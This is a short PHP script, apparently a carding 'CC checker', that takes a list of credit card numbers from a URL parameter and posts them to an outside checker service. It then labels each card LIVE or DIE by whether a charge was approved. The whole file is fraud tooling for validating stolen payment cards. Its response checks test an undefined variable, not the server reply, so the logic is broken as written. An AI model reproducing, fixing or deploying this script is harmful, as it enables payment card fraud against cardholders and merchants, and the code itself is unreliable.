<?php

$lista = $_GET['lista'];



$url = "https://vscendols.com/preauth/check.php";



$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$data = "ajax=1&do=check&cclist=$lista";
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

$resp = curl_exec($curl);

//=================== [ RESPONSES ] ===================//

if (preg_match("/Charged /i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: APPROVED CVV ✅ @Im_kZ_T<br> ➤ Receipt : hidden';
    
    
}
elseif (preg_match("/CVV /i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DECLINED BY MARCHANT ❌</span><br>';
 
}

curl_close($curl);
ob_flush();


?>
